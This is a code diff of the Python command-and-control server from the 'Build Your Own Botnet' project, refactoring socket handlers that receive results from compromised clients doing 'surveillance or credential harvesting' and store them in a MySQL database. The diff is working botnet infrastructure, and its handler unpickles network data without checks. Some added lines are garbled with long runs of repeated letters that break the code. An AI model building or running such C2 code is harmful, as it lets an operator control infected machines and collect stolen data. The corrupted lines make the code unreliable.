-            operating in passive mode (i.e. non-interactive
-            sessions doing automated tasks, such as
-            surveillance or credential harvesting)
-            
-        - Completed tasks
-            handles incoming tasks completed by clients
-            operating in passive mode and passes them to
-            the database for storage
-        
-        """
-        
-        allow_reuse_address = True
-
-        def __init__(self, server, host='0.0.0.0', port=1338):
-            """
-            Create a new task server instance
-
-            `Required`
-            :param server:      byob.server.Server instance
-
-            `Optional`
-            :param str host:    IPv4 address
-            :param int port:    port number
-            
-            """
-            SocketServer.ThreadingTCPServer.__init__(self, (host, port), C2.TaskHandler)
-            self._server    = server
-            self.timeout    = 1.0
-            self.abort      = False
-
-
-        def serve_until_stopped(self):
-            while True:
-                rd, wr, ex = select.select([self.socket.fileno()], [], [], self.timeout)
-                if rd:
-                    self.handle_request()
-                abort = self.abort
-                if abort:
-                    break
-        
-    class TaskHandler(SocketServer.StreamRequestHandler):
-        """
-        Request Handler for TCP Server
-        that handles incoming requests from
-        clients operating in passive mode
-        
-        """
-        def handle(self):
-            """
-            Unpack, decrypt, and unpickle an incoming
-            completed task from a client, and pass it
-            to the Database for storage
-            
-            """
-            while True:
-                try:
-                    bits = self.connection.recv(4)
-                    if len(bits) < 4:
-                        break
-                    size = struct.unpack('!L', bits)[0]
-                    buff = self.connection.recv(size)
-                    while len(buff) < size:
-                        buff += self.connection.recv(size - len(buff))
-                    task = pickle.loads(buff)
-                    if isinstance(task, dict):
-                        self._server.database.handle_task(task)
                     else:
-                        globals()['_debugger'].debug(str(e))
-                except Exception as e:
-                    globals()['_debugger'].error(str(e))
+                        if task.get('result') and task.get('result') != 'None':
+                            globals()['c2'].display(task.get('result'))
+                            globals()['c2'].database.handle_task(task)
+
+                    if globals()['_abort']:
+                        break
+                    
+                    self._prompt = None
+                    
+            except Exception as e:
+                self._error(str(e))
+                time.sleep(1)
+                break
+            
+        self._active.clear()
+        globals()['c2']._return()
+
+
+  
+class TaskHandler(SocketServer.StreamRequestHandler):
+    """
+    Request Handler for TCP Server
+    that handles incoming requests from
+    clients operating in passive mode
+    
+    """
+    def handle(self):
+        """
+        Unpack, decrypt, and unpickle an incoming
+        completed task from a client, and pass it
+        to the Database for storage
+        
+        """
+        while True:
+            try:
+                bits = self.connection.recv(4)
+                if len(bits) < 4:
+                    break
+                size = struct.unpack('!L', bits)[0]
+                buff = self.connection.recv(size)
+                while len(buff) < size:zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
+                    buff += self.connection.recv(size - len(buff))
+   aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa             task = pickle.loads(buff)
+                if isinstance(task, dict):
+                    self._server.database.handle_task(task)
+                else:
+                    globals()['_debugger'].debug(str(e))
+            except Exception as e:
+                globals()['_debugger'].error(str(e))
+
+
+class Server(SocketServer.ThreadingTCPServer):
+    """
+    - Remote imports
+        hosts Python packages and user-defined modules
+        for remote importing by authenticated sessions
+
+    - Resource requests 
+        serves files/resources requested by sessions 
+        operating in passive mode (i.e. non-interactive
+        sessions doing automated tasks, such as
+        surveillance or credential harvesting)
+        
+    - Completed tasks
+        handles incoming tasks completed by clients
+        operating in passive mode and passes them to
+        the database for storage
+    
+    """
+    
+    allow_reuse_address = True
+
+    def __init__(self, host='0.0.0.0', port=1338, handler=TaskHandler):
+        """
+        Create a new task server instanc
+
+        `Optional`
+        :param str host:    IPv4 address
+        :param int port:    port number
+        
+        """
+        SocketServer.ThreadingTCPServer.__init__(self, (host, port), handler)
+        self.timeout    = 1.0
+        self.abort      = False
+
+    def serve_until_stopped(self):
+        while True:
+            rd, wr, ex = select.select([self.socket.fileno()], [], [], self.timeout)
+            if rd:
+                self.handle_request()
+            abort = self.abort
+            if abort:
+                break
 
 
 def main():
     parser   = argparse.ArgumentParser(prog='server.py', description="Command & Control Server (Build Your Own Botnet)", version='0.1.3')
     server   = parser.add_argument_group('server')
     database = parser.add_argument_group('database')
-    server.add_argument('--host', dest='h', metavar='HOST', action='store', type=str, default='0.0.0.0', help='server hostname or IP address')
-    server.add_argument('--port', dest='p', metavar='PORT', action='store', type=int, default=1337, help='server port number')
+    server.add_argument('--host', dest='server_host', metavar='HOST', action='store', type=str, default='0.0.0.0', help='server hostname or IP address')
+    server.add_argument('--port', dest='server_port', metavar='PORT', action='store', type=int, default=1337, help='server port number')
     database.add_argument('--mysql-host', dest='host', metavar='HOST', action='store', type=str, default='localhost', help='mysql hostname')
     database.add_argument('--mysql-port', dest='port', metavar='PORT', action='store', type=int, default=3306, help='mysql port number')
     database.add_argument('--mysql-user', dest='user', metavar='USER', action='store', type=str, default='root', help='mysql login')
     database.add_argument('--mysql-pass', dest='pass', metavar='PASS', action='store', type=str, default='toor', help='mysql password')
 
     try:
-        options = parser.parse_args()
-        globals()['_debug'] = options.debug
-        globals()['_threads']['server']  = C2(**dict(options._get_kwargs()))
-        globals()['_threads']['server'].start()
+        options = parser.parse_args()   
+        globals()['c2']  = C2(options)
+        globals()['c2'].run()
     except Exception as e:
         util.display("\n[-] ", color='red', style='bright', end='')
         util.display("Error: {}\n".format(str(e)), color='reset', style='dim')
